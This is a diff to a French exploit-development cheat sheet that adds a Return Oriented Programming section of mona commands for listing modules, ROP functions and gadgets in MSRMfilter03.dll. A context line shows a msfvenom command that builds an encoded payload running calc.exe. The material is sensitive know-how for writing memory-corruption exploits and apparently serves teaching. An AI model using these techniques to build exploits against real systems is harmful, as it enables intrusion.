@@ -97,6 +97,17 @@ msfvenom -p windows/exec -e x86/unicode_mixed CMD=calc.exe BufferRegister=eax --
 
 Il est cependant nécessaire d'initialiser la valeur de registre eax pour qu'elle pointe vers le début du buffer. FuzzySecurity montre une démarche (voir détail complet dans le [tutorial](http://www.fuzzysecurity.com/tutorials/expDev/5.html)). 
 
+## Return Oriented Programming (ROP)
+
+Les commandes mona suivantes sont utiles pour les exploits ROP:
+
+``` bash
+!mona modules # Liste les informations sur les différents modules
+!mona ropfunc -m MSRMfilter03.dll -cpb '\x00\x09\x0a' # Liste les fonctions utiles pour ROP dans MSRMfilter03.dll (VirtualAlloc, etc.)
+!mona rop -m MSRMfilter03.dll -cpb '\x00\x09\x0a' # Liste les gadgets dans MSRMfilter03.dll. Cette commande génère plusieurs fichiers. Le fichier rop_chains.txt contient la structure (valeurs à mettre dans les registres, etc.) pour faire un exploit valide.
+```
+
+
 ## Ressources
 
 ### Liens externes
